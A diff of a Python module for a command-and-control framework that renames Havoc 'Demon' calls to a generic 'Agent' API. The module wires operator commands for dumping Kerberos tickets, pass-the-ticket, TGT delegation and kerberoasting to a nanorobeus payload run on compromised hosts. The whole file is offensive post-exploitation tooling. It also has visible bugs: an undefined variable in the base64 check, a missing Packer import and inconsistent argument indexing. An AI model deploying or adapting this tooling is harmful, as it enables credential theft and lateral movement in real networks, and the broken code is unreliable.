@@ -1,4 +1,4 @@
-from havoc import Demon, RegisterCommand, RegisterModule
+from vaelix_host import Agent, RegisterCommand, RegisterModule
 from os.path import exists
 import re
 
@@ -8,9 +8,9 @@ def is_hex_number(number):
 def is_base64(s):
     return re.match(r'^(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?$', number) is not None
 
-def luid( demonID, *param ):
+def luid( agentID, *param ):
     TaskID : str    = None
-    demon  : Demon  = None
+    agent  : Agent  = None
     packer : Packer = Packer()
 
     command : str   = "luid"
@@ -20,9 +20,9 @@ def luid( demonID, *param ):
     arg4    : str   = ""
     num_params = len(param)
 
-    demon = Demon( demonID )
+    agent = Agent( agentID )
 
-    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to execute luid" )
+    TaskID = agent.ConsoleWrite( agent.CONSOLE_TASK, f"Tasked agent to execute luid" )
 
     packer.addstr( command )
     packer.addstr( arg1 )
@@ -30,13 +30,13 @@ def luid( demonID, *param ):
     packer.addstr( arg3 )
     packer.addstr( arg4 )
 
-    demon.InlineExecute( TaskID, "go", f"bin/nanorobeus.{demon.ProcessArch}.o", packer.getbuffer(), False )
+    agent.InlineExecute( TaskID, "go", f"bin/nanorobeus.{agent.ProcessArch}.o", packer.getbuffer(), False )
 
     return TaskID
 
-def sessions( demonID, *param ):
+def sessions( agentID, *param ):
     TaskID : str    = None
-    demon  : Demon  = None
+    agent  : Agent  = None
     packer : Packer = Packer()
 
     command : str   = "sessions"
@@ -46,27 +46,27 @@ def sessions( demonID, *param ):
     arg4    : str   = ""
     num_params = len(param)
 
-    demon = Demon( demonID )
+    agent = Agent( agentID )
 
     if num_params > 2:
-        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many arguments" )
+        agent.ConsoleWrite( agent.CONSOLE_ERROR, "Too many arguments" )
         return
     elif num_params == 2:
         arg1 = param[ 1 ]
         arg2 = param[ 2 ]
         if arg1 != '/luid':
-            demon.ConsoleWrite( demon.CONSOLE_ERROR, f"Invalid first argument: {arg1}" )
+            agent.ConsoleWrite( agent.CONSOLE_ERROR, f"Invalid first argument: {arg1}" )
             return
         if not is_hex_number(arg2):
-            demon.ConsoleWrite( demon.CONSOLE_ERROR, f"Invalid second argument: {arg2}" )
+            agent.ConsoleWrite( agent.CONSOLE_ERROR, f"Invalid second argument: {arg2}" )
             return
     elif num_params == 1:
         arg1 = param[ 1 ]
         if arg1 != '/all':
-            demon.ConsoleWrite( demon.CONSOLE_ERROR, f"Invalid first argument: {arg1}" )
+            agent.ConsoleWrite( agent.CONSOLE_ERROR, f"Invalid first argument: {arg1}" )
             return
 
-    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to execute sessions" )
+    TaskID = agent.ConsoleWrite( agent.CONSOLE_TASK, f"Tasked agent to execute sessions" )
 
     packer.addstr( command )
     packer.addstr( arg1 )
@@ -74,13 +74,13 @@ def sessions( demonID, *param ):
     packer.addstr( arg3 )
     packer.addstr( arg4 )
 
-    demon.InlineExecute( TaskID, "go", f"bin/nanorobeus.{demon.ProcessArch}.o", packer.getbuffer(), False )
+    agent.InlineExecute( TaskID, "go", f"bin/nanorobeus.{agent.ProcessArch}.o", packer.getbuffer(), False )
 
     return TaskID
 
-def klist( demonID, *param ):
+def klist( agentID, *param ):
     TaskID : str    = None
-    demon  : Demon  = None
+    agent  : Agent  = None
     packer : Packer = Packer()
 
     command : str   = "klist"
@@ -90,27 +90,27 @@ def klist( demonID, *param ):
     arg4    : str   = ""
     num_params = len(param)
 
-    demon = Demon( demonID )
+    agent = Agent( agentID )
 
     if num_params > 2:
-        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many arguments" )
+        agent.ConsoleWrite( agent.CONSOLE_ERROR, "Too many arguments" )
         return
     elif num_params == 2:
         arg1 = param[ 1 ]
         arg2 = param[ 2 ]
         if arg1 != '/luid':
-            demon.ConsoleWrite( demon.CONSOLE_ERROR, f"Invalid first argument: {arg1}" )
+            agent.ConsoleWrite( agent.CONSOLE_ERROR, f"Invalid first argument: {arg1}" )
             return
         if not is_hex_number(arg2):
-            demon.ConsoleWrite( demon.CONSOLE_ERROR, f"Invalid second argument: {arg2}" )
+            agent.ConsoleWrite( agent.CONSOLE_ERROR, f"Invalid second argument: {arg2}" )
             return
     elif num_params == 1:
         arg1 = param[ 1 ]
         if arg1 != '/all':
-            demon.ConsoleWrite( demon.CONSOLE_ERROR, f"Invalid first argument: {arg1}" )
+            agent.ConsoleWrite( agent.CONSOLE_ERROR, f"Invalid first argument: {arg1}" )
             return
 
-    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to execute klist" )
+    TaskID = agent.ConsoleWrite( agent.CONSOLE_TASK, f"Tasked agent to execute klist" )
 
     packer.addstr( command )
     packer.addstr( arg1 )
@@ -118,13 +118,13 @@ def klist( demonID, *param ):
     packer.addstr( arg3 )
     packer.addstr( arg4 )
 
-    demon.InlineExecute( TaskID, "go", f"bin/nanorobeus.{demon.ProcessArch}.o", packer.getbuffer(), False )
+    agent.InlineExecute( TaskID, "go", f"bin/nanorobeus.{agent.ProcessArch}.o", packer.getbuffer(), False )
 
     return TaskID
 
-def dump( demonID, *param ):
+def dump( agentID, *param ):
     TaskID : str    = None
-    demon  : Demon  = None
+    agent  : Agent  = None
     packer : Packer = Packer()
 
     command : str   = "dump"
@@ -134,27 +134,27 @@ def dump( demonID, *param ):
     arg4    : str   = ""
     num_params = len(param)
 
-    demon = Demon( demonID )
+    agent = Agent( agentID )
 
     if num_params > 2:
-        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many arguments" )
+        agent.ConsoleWrite( agent.CONSOLE_ERROR, "Too many arguments" )
         return
     elif num_params == 2:
         arg1 = param[ 1 ]
         arg2 = param[ 2 ]
         if arg1 != '/luid':
-            demon.ConsoleWrite( demon.CONSOLE_ERROR, f"Invalid first argument: {arg1}" )
+            agent.ConsoleWrite( agent.CONSOLE_ERROR, f"Invalid first argument: {arg1}" )
             return
         if not is_hex_number(arg2):
-            demon.ConsoleWrite( demon.CONSOLE_ERROR, f"Invalid second argument: {arg2}" )
+            agent.ConsoleWrite( agent.CONSOLE_ERROR, f"Invalid second argument: {arg2}" )
             return
     elif num_params == 1:
         arg1 = param[ 1 ]
         if arg1 != '/all':
-            demon.ConsoleWrite( demon.CONSOLE_ERROR, f"Invalid first argument: {arg1}" )
+            agent.ConsoleWrite( agent.CONSOLE_ERROR, f"Invalid first argument: {arg1}" )
             return
 
-    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to execute dump" )
+    TaskID = agent.ConsoleWrite( agent.CONSOLE_TASK, f"Tasked agent to execute dump" )
 
     packer.addstr( command )
     packer.addstr( arg1 )
@@ -162,13 +162,13 @@ def dump( demonID, *param ):
     packer.addstr( arg3 )
     packer.addstr( arg4 )
 
-    demon.InlineExecute( TaskID, "go", f"bin/nanorobeus.{demon.ProcessArch}.o", packer.getbuffer(), False )
+    agent.InlineExecute( TaskID, "go", f"bin/nanorobeus.{agent.ProcessArch}.o", packer.getbuffer(), False )
 
     return TaskID
 
-def ptt( demonID, *param ):
+def ptt( agentID, *param ):
     TaskID : str    = None
-    demon  : Demon  = None
+    agent  : Agent  = None
     packer : Packer = Packer()
 
     command : str   = "ptt"
@@ -178,36 +178,36 @@ def ptt( demonID, *param ):
     arg4    : str   = ""
     num_params = len(param)
 
-    demon = Demon( demonID )
+    agent = Agent( agentID )
 
     if num_params > 3:
-        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many arguments" )
+        agent.ConsoleWrite( agent.CONSOLE_ERROR, "Too many arguments" )
         return
     if num_params < 1:
-        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Not enough arguments" )
+        agent.ConsoleWrite( agent.CONSOLE_ERROR, "Not enough arguments" )
         return
 
     arg1 = param[ 1 ]
     if not is_base64(arg1):
-        demon.ConsoleWrite( demon.CONSOLE_ERROR, f"Invalid first argument: {arg1}" )
+        agent.ConsoleWrite( agent.CONSOLE_ERROR, f"Invalid first argument: {arg1}" )
         return
 
     if num_params == 2:
         arg2 = param[ 2 ]
         if arg2 != '/all':
-            demon.ConsoleWrite( demon.CONSOLE_ERROR, f"Invalid second argument: {arg2}" )
+            agent.ConsoleWrite( agent.CONSOLE_ERROR, f"Invalid second argument: {arg2}" )
             return
     elif num_params == 3:
         arg2 = param[ 2 ]
         arg3 = param[ 3 ]
         if arg2 != '/luid':
-            demon.ConsoleWrite( demon.CONSOLE_ERROR, f"Invalid second argument: {arg2}" )
+            agent.ConsoleWrite( agent.CONSOLE_ERROR, f"Invalid second argument: {arg2}" )
             return
         if not is_hex_number(arg3):
-            demon.ConsoleWrite( demon.CONSOLE_ERROR, f"Invalid third argument: {arg3}" )
+            agent.ConsoleWrite( agent.CONSOLE_ERROR, f"Invalid third argument: {arg3}" )
             return
 
-    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to execute ptt" )
+    TaskID = agent.ConsoleWrite( agent.CONSOLE_TASK, f"Tasked agent to execute ptt" )
 
     packer.addstr( command )
     packer.addstr( arg1 )
@@ -215,13 +215,13 @@ def ptt( demonID, *param ):
     packer.addstr( arg3 )
     packer.addstr( arg4 )
 
-    demon.InlineExecute( TaskID, "go", f"bin/nanorobeus.{demon.ProcessArch}.o", packer.getbuffer(), False )
+    agent.InlineExecute( TaskID, "go", f"bin/nanorobeus.{agent.ProcessArch}.o", packer.getbuffer(), False )
 
     return TaskID
 
-def purge( demonID, *param ):
+def purge( agentID, *param ):
     TaskID : str    = None
-    demon  : Demon  = None
+    agent  : Agent  = None
     packer : Packer = Packer()
 
     command : str   = "purge"
@@ -231,26 +231,26 @@ def purge( demonID, *param ):
     arg4    : str   = ""
     num_params = len(param)
 
-    demon = Demon( demonID )
+    agent = Agent( agentID )
 
     if num_params > 2:
-        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many arguments" )
+        agent.ConsoleWrite( agent.CONSOLE_ERROR, "Too many arguments" )
         return
     elif num_params == 2:
         arg1 = param[ 1 ]
         arg2 = param[ 2 ]
         if arg1 != '/luid':
-            demon.ConsoleWrite( demon.CONSOLE_ERROR, f"Invalid first argument: {arg1}" )
+            agent.ConsoleWrite( agent.CONSOLE_ERROR, f"Invalid first argument: {arg1}" )
             return
         if not is_hex_number(arg2):
-            demon.ConsoleWrite( demon.CONSOLE_ERROR, f"Invalid second argument: {arg2}" )
+            agent.ConsoleWrite( agent.CONSOLE_ERROR, f"Invalid second argument: {arg2}" )
             return
     elif num_params == 1:
         arg1 = param[ 1 ]
-        demon.ConsoleWrite( demon.CONSOLE_ERROR, f"Invalid first argument: {arg1}" )
+        agent.ConsoleWrite( agent.CONSOLE_ERROR, f"Invalid first argument: {arg1}" )
         return
 
-    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to execute purge" )
+    TaskID = agent.ConsoleWrite( agent.CONSOLE_TASK, f"Tasked agent to execute purge" )
 
     packer.addstr( command )
     packer.addstr( arg1 )
@@ -258,13 +258,13 @@ def purge( demonID, *param ):
     packer.addstr( arg3 )
     packer.addstr( arg4 )
 
-    demon.InlineExecute( TaskID, "go", f"bin/nanorobeus.{demon.ProcessArch}.o", packer.getbuffer(), False )
+    agent.InlineExecute( TaskID, "go", f"bin/nanorobeus.{agent.ProcessArch}.o", packer.getbuffer(), False )
 
     return TaskID
 
-def tgtdeleg( demonID, *param ):
+def tgtdeleg( agentID, *param ):
     TaskID : str    = None
-    demon  : Demon  = None
+    agent  : Agent  = None
     packer : Packer = Packer()
 
     command : str   = "tgtdeleg"
@@ -274,15 +274,15 @@ def tgtdeleg( demonID, *param ):
     arg4    : str   = ""
     num_params = len(param)
 
-    demon = Demon( demonID )
+    agent = Agent( agentID )
 
     if num_params != 1:
-        demon.ConsoleWrite( demon.CONSOLE_ERROR, "One argument must be entered" )
+        agent.ConsoleWrite( agent.CONSOLE_ERROR, "One argument must be entered" )
         return
 
     arg1 = param[ 1 ]
 
-    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to execute tgtdeleg" )
+    TaskID = agent.ConsoleWrite( agent.CONSOLE_TASK, f"Tasked agent to execute tgtdeleg" )
 
     packer.addstr( command )
     packer.addstr( arg1 )
@@ -290,13 +290,13 @@ def tgtdeleg( demonID, *param ):
     packer.addstr( arg3 )
     packer.addstr( arg4 )
 
-    demon.InlineExecute( TaskID, "go", f"bin/nanorobeus.{demon.ProcessArch}.o", packer.getbuffer(), False )
+    agent.InlineExecute( TaskID, "go", f"bin/nanorobeus.{agent.ProcessArch}.o", packer.getbuffer(), False )
 
     return TaskID
 
-def kerberoast( demonID, *param ):
+def kerberoast( agentID, *param ):
     TaskID : str    = None
-    demon  : Demon  = None
+    agent  : Agent  = None
     packer : Packer = Packer()
 
     command : str   = "kerberoast"
@@ -306,15 +306,15 @@ def kerberoast( demonID, *param ):
     arg4    : str   = ""
     num_params = len(param)
 
-    demon = Demon( demonID )
+    agent = Agent( agentID )
 
     if num_params != 1:
-        demon.ConsoleWrite( demon.CONSOLE_ERROR, "One argument must be entered" )
+        agent.ConsoleWrite( agent.CONSOLE_ERROR, "One argument must be entered" )
         return
 
     arg1 = param[ 0 ]
 
-    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to execute kerberoast" )
+    TaskID = agent.ConsoleWrite( agent.CONSOLE_TASK, f"Tasked agent to execute kerberoast" )
 
     packer.addstr( command )
     packer.addstr( arg1 )
@@ -322,7 +322,7 @@ def kerberoast( demonID, *param ):
     packer.addstr( arg3 )
     packer.addstr( arg4 )
 
-    demon.InlineExecute( TaskID, "go", f"bin/nanorobeus.{demon.ProcessArch}.o", packer.getbuffer(), False )
+    agent.InlineExecute( TaskID, "go", f"bin/nanorobeus.{agent.ProcessArch}.o", packer.getbuffer(), False )
 
     return TaskID
 
